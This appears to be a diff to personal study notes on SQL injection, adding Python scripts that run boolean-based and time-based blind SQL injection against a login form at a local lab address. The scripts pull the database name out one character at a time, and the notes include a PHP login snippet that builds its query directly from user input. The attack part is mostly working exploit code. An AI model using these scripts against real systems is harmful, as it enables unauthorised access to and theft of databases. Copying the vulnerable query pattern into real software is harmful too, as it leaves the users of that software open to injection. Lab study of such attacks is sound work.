@@ -82,24 +82,65 @@ SELECT * FROM users WHERE username='xzy' OR BINARY substring(database(), 1, 1) =
 import requests
 import sys
 
-url = 'https://'
+url = 'http://192.168.1.16/login.php'
 
 for i in range(1, 10):
   for c in range(0x20, 0x7f):
-    username = "xzy' OR BINARY substring(database(), %d, 1) ='%s' -- " % (i, chr(c))
+    username = "xyz' OR BINARY substring(database(), %d, 1) ='%s' -- " % (i, chr(c))
     password = "xyz"
     form = {'username': username, 'password': password, 'submit': 'Login'}
     response = requests.post(url, data=form)
     if "Halaman administrasi blog" in response.text:
       status = True
-    elif "Username atau password salah" in response.text:
+    elif "Username atau password salah!" in response.text:
       status = False
     
     if status == True:
       sys.stdout.write(chr(c))
       sys.stdout.flush()
       break
-print ''
+
+print(" ")
+
+```
+
+# SLQI BLIND TIME
+
+```php
+$username = $_POST['username'];
+$password = $_POST['password'];
+
+$login = mysqli_query($conn, "SELECT * FROM users WHERE username = '{$username}' AND password = '{$password}'");
+
+die("System Sedang Maintenet...");
+```
+
+```python
+import requests
+import sys
+
+url = 'http://192.168.1.16/login.php'
+
+for i in range(1, 10):
+  for c in range(0x20, 0x7f):
+    username = "xyz' OR IF(BINARY substring(database(), %d, 1) ='%s', sleep(3), 0) -- " % (i, chr(c))
+    password = "xyz"
+    form = {'username': username, 'password': password, 'submit': 'Login'}
+    
+    start = time.time()
+    
+    response = requests.post(url, data=form)
+    
+    end = time.time()
+    selisih = end - start
+    
+    if selisih >= 3.0:
+      sys.stdout.write(chr(c))
+      sys.stdout.flush()
+      break
+
+print(" ")
+
 ```
 
 # SQLI INSERT
